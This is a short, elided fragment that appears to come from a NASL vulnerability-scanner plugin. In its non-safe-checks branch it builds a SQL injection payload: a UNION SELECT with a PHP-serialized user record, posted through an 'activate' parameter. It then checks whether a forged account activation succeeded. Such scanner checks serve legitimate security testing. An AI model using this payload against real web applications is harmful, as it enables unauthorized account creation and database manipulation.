...
if(!safe_checks()){
	...
	pass = rand_str();
	email = NASLString( user, "@", get_host_name() );
	sploit = NASLString( "UNION SELECT ", "\"\",", "\"\",", "0,", "'a:4:{", "s:9:\"user_name\";s:", strlen( user ), ":\"", user, "\";", "s:13:\"user_password\";s:", strlen( pass ), ":\"", pass, "\";", "s:10:\"user_email\";s:", strlen( email ), ":\"", email, "\";", "s:15:\"user_hide_email\";s:1:\"1\";}" );
	postdata = NASLString( "activate=", rand_str(), "'+", urlencode( str: sploit ) );
	...
	if(ContainsString( res, "Your account has been verified." )){
